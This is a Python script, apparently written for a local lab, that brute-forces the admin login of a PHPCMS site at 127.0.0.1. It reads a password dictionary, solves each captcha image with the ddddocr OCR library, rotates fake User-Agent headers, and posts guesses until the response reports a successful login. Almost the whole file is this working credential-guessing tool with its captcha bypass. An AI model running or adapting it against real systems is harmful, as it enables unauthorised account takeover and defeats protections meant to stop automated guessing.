from random import choice
import requests
import ddddocr
import os
import time
import datetime

'''
请求一个验证码接口,需携带cookie和时间戳,返回二进制图片
cookie使用session机制,时间戳本地生成
'''

ocr = ddddocr.DdddOcr(old=True)
#   随机请求头
def getRdmUserAgents():
    USER_AGENTS = [
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
            "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        ]
    return choice(USER_AGENTS)

#   返回密码列表
def getPasswordList():
    payloads = []
    path = "D:\\tools\\tools\\杂项\\字典\\fuzzDicts\\passwordDict\\top500.txt"
    with open(path,"r") as f:
        for i in range(10):
            payloads.append(f.readline().strip())

    return payloads
            

def getNow():
    ct = time.time()                                        # 取得系统时间
    local_time = time.localtime(ct)
    date_head = time.strftime("%Y%m%d%H%M%S", local_time)   # 格式化时间
    date_m_secs = str(datetime.datetime.now().timestamp()).split(".")[-1]    # 毫秒级时间戳
    time_stamp = "%s%.3s" % (date_head, date_m_secs)         # 拼接时间字符串

    return time_stamp

def save_images(name,image):
    save_path = "./imgs/"
    with open (save_path + name + ".png", 'wb') as f:
        f.write(image)

#   请求固定的一个url，直接返回图片二进制数据
def getImageAuthCode(reqSession):
    #   验证码请求
    ImageAuthCode_headers = {}
    ImageAuthCode_headers["User-Agent"] = getRdmUserAgents()
    # ImageAuthCode_headers['Cookie'] = 'PHPSESSID=qrdkijm71t404q4iuqgfkij4d1'
    ImageAuthCodeUrl = "http://127.0.0.1:82/api.php?op=checkcode&m=admin&c=index&a=checkcode&time=0.%s"%(getNow())
    try:
        res = reqSession.get(ImageAuthCodeUrl, headers=ImageAuthCode_headers, timeout=3).content
        result = ocr.classification(res)
        # print(result)
        save_images(result,res)
    except requests.RequestException as e: #e为异常信息
        print("[!] 请求异常！")

    return result

def login(reqSession,payload,authCode):
    login_path = 'http://127.0.0.1:82/index.php?m=admin&c=index&a=login&dosubmit=1'

    data = 'dosubmit=&username=phpcms&password='+ payload +'&code=' + authCode

    login_headers = {}
    login_headers["User-Agent"] = getRdmUserAgents()
    login_headers["Content-Type"]= "application/x-www-form-urlencoded"

    try:
        res = reqSession.post(login_path, headers=login_headers, data=data, timeout=3).text
        if "登录成功" in res:
            print("\r\n[+]登录成功 密码: %s"%(payload))
            exit()
    except requests.RequestException as e: #e为异常信息
        print("[!] 请求异常！")

def startScan():
    payloads = getPasswordList() #list
    print("[+] 共计 %s 个payload."%(len(payloads)))
    scanSession = requests.Session()
    count = 1
    for payload in payloads:
        authCode = getImageAuthCode(scanSession)
        print("\r [-] 正在使用第 %s 个payload: %s ; 验证码: %s 验证登录."%(count,payload,authCode), end="")
        login(scanSession, payload, authCode)
        count += 1

def main():
    
    os.environ["http_proxy"] = "http://127.0.0.1:8080"
    startScan()

if __name__ == "__main__":
    main()

# getImageAuthCode("http://127.0.0.1:82/api.php?op=checkcode&code_len=5&font_size=14&width=120&height=26&font_color=&background=")